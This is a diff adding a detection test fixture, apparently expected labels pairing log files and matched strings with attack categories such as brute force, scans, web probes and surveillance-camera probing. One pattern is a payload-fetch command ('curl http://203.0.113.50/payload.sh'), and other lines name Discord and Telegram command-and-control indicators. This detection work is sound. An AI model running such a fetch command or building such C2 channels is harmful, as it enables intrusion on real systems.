@@ -1,0 +1,22 @@
+# path|line_contains|label
+auth_bruteforce.log|203.0.113.50|bruteforce
+auth_bruteforce.log|198.51.100.200|invalid_user
+auth_scan.log|192.0.2.99|port_scan_burst
+nginx_attack.log|203.0.113.77|web_probe
+syslog_suspicious.log|203.0.113.88|firewall_block_burst
+syslog_suspicious.log|curl http://203.0.113.50/payload.sh|suspicious_command
+benign.log||benign
+surveillance_probes.log|203.0.113.10|flock.onvif_probe
+surveillance_probes.log|203.0.113.10|flock.admin_template
+surveillance_probes.log|203.0.113.11|argos.camera_path_scrape
+surveillance_probes.log|203.0.113.12|camofox.ua
+surveillance_probes.log|203.0.113.12|camofox.headless_automation
+surveillance_probes.log|203.0.113.13|scan.nuclei
+surveillance_probes.log|203.0.113.13|scan.masscan_ua
+surveillance_probes.log|203.0.113.14|scan.shodan_censys
+surveillance_probes.log|203.0.113.15|flock.port_probe_adb_frp
+surveillance_probes.log|discord.com|redsparrow.messaging_c2
+surveillance_probes.log|telegram.org|redsparrow.payload_pipe
+surveillance_probes.log|red-sparrow|redsparrow.name_ioc
+surveillance_probes.log|203.0.113.16|argos.insecam_style
+surveillance_benign.log||none
